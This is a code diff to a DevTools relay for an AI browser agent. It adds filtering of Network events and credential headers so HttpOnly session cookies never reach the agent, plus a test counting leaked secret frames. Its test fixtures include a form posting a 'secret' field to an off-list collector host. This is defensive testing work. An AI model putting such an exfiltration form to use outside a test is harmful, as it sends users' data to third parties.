@@ -259,10 +259,47 @@ function createCapabilityStore() {
   };
 }
 
+// Events are filtered too, not only commands: an allowlisted Network.enable
+// makes Chromium emit request and response headers, and its ExtraInfo events
+// carry raw Cookie and Set-Cookie values, HttpOnly ones included. Those never
+// leave the device. ExtraInfo events are dropped, the flags that promise them
+// are cleared (so Playwright does not wait for them), and credential headers
+// are removed from what remains.
+const DROPPED_EVENTS = new Set([
+  'Network.requestWillBeSentExtraInfo', 'Network.responseReceivedExtraInfo',
+  'Network.responseReceivedEarlyHints', 'Network.webSocketHandshakeResponseReceived',
+  'Network.webSocketWillSendHandshakeRequest',
+]);
+const CREDENTIAL_HEADERS = /^(cookie|set-cookie2?|authorization|proxy-authorization)$/i;
+const withoutCredentials = (headers) => (headers && typeof headers === 'object'
+  ? Object.fromEntries(Object.entries(headers).filter(([k]) => !CREDENTIAL_HEADERS.test(k)))
+  : headers);
+function redactResponse(r) {
+  if (!r || typeof r !== 'object') return r;
+  const { headersText, requestHeadersText, ...rest } = r;
+  void headersText; void requestHeadersText;
+  return { ...rest, headers: withoutCredentials(r.headers), ...(r.requestHeaders ? { requestHeaders: withoutCredentials(r.requestHeaders) } : {}) };
+}
+/** The event as the agent may see it, or null to drop it. */
+function redactEvent(method, params) {
+  if (DROPPED_EVENTS.has(method)) return null;
+  if (method === 'Network.requestWillBeSent') {
+    return {
+      ...params,
+      request: { ...params.request, headers: withoutCredentials(params.request?.headers) },
+      ...(params.redirectResponse ? { redirectResponse: redactResponse(params.redirectResponse) } : {}),
+      redirectHasExtraInfo: false,
+    };
+  }
+  if (method === 'Network.responseReceived') return { ...params, response: redactResponse(params.response), hasExtraInfo: false };
+  return params;
+}
+
 function startRelay(tabWsUrl, caps) {
   const server = http.createServer((_, res) => { res.statusCode = 404; res.end(); });
   const wss = new WebSocketServer({ noServer: true });
-  const state = { lease: null, refusals: [] };
+  // `watch`: a test can name a secret and count where it was seen.
+  const state = { lease: null, refusals: [], watch: null, seenFromTab: 0, sentToAgent: 0 };
 
   server.on('upgrade', (req, socket, head) => {
     const token = (req.url.match(/^\/devtools\/browser\/([\w-]+)$/) || [])[1];
@@ -285,7 +322,13 @@ function startRelay(tabWsUrl, caps) {
     const sendTab = (m) => (tab.readyState === WebSocket.OPEN ? tab.send(JSON.stringify(m)) : queue.push(m));
     tab.on('open', () => { while (queue.length) tab.send(JSON.stringify(queue.shift())); });
     const reply = (id, sessionId, body) => client.send(JSON.stringify({ id, ...(sessionId ? { sessionId } : {}), ...body }));
-    const emit = (method, params, sessionId) => client.send(JSON.stringify({ method, params, ...(sessionId ? { sessionId } : {}) }));
+    const emit = (method, params, sessionId) => {
+      const safe = redactEvent(method, params);
+      if (safe === null) return;
+      const frame = JSON.stringify({ method, params: safe, ...(sessionId ? { sessionId } : {}) });
+      if (state.watch && frame.includes(state.watch)) state.sentToAgent++;
+      client.send(frame);
+    };
     let targetInfo = null;
     const knownSessions = new Set([TAB_SESSION]);
 
@@ -303,6 +346,7 @@ function startRelay(tabWsUrl, caps) {
     client.on('error', end);
 
     tab.on('message', (raw) => {
+      if (state.watch && String(raw).includes(state.watch)) state.seenFromTab++;
       const msg = JSON.parse(raw);
       if (msg.id !== undefined) {
         const p = pending.get(msg.id);
@@ -376,6 +420,7 @@ const offlist = await countingServer('offlist.test', {
   '/collect': (req, res) => res.end('ok'),
   '/lib.js': (req, res) => { res.setHeader('content-type', 'text/javascript'); res.end('window.__lib = 1;'); },
 });
+const SESSION_SECRET = `S3SS10N-${crypto.randomBytes(8).toString('hex')}`;
 const priv = await countingServer('127.0.0.1 (private)', { '/admin': (req, res) => res.end('router admin') });
 const allowed = await countingServer('allowed.test', {
   '/': html(`<title>allowed</title>
@@ -384,6 +429,12 @@ const allowed = await countingServer('allowed.test', {
     <form id="f" method="post" action="http://offlist.test/collect"><input name="q" value="secret"><button>go</button></form>
     <script src="http://offlist.test/lib.js"></script>`),
   '/two': html('<title>allowed two</title>two'),
+  // Signs in: an HttpOnly session cookie, which page script cannot read.
+  '/login': (req, res) => {
+    res.setHeader('set-cookie', `sid=${SESSION_SECRET}; HttpOnly; Path=/`);
+    res.setHeader('content-type', 'text/html');
+    res.end('<!doctype html><title>signed in</title>ok');
+  },
   '/redirect': (req, res) => { res.statusCode = 302; res.setHeader('location', 'http://offlist.test/'); res.end(); },
   '/framer': html('<title>framer</title><iframe src="http://offlist.test/"></iframe>'),
   '/xframe': html('<title>xframe</title><iframe src="http://allowed2.test/two"></iframe>'),
@@ -485,6 +536,21 @@ try {
 
   await page.goto(`${ALLOWED}/two`);
   check('navigation within the consented origin still works', (await page.title()) === 'allowed two');
+
+  {
+    // A compromised server enables Network events and signs in on a consented
+    // page: Chromium reports the HttpOnly cookie in ExtraInfo events and
+    // headers. None of it may reach the agent's side of the relay.
+    relay.state.watch = SESSION_SECRET;
+    await page.goto(`${ALLOWED}/login`);
+    await page.goto(`${ALLOWED}/two`); // sends the cookie back
+    await sleep(300);
+    const { seenFromTab, sentToAgent } = relay.state;
+    relay.state.watch = null;
+    check('control: Chromium did emit the HttpOnly cookie in Network events', seenFromTab > 0, `${seenFromTab} frame(s)`);
+    check('P1: no cookie or credential header reaches the agent through Network events', sentToAgent === 0, `${sentToAgent} frame(s)`);
+    check('navigation still works with ExtraInfo events dropped', (await page.title()) === 'allowed two');
+  }
 
   // ── Downloads (CLI path: the policy's own BROWSER-level session)
   {
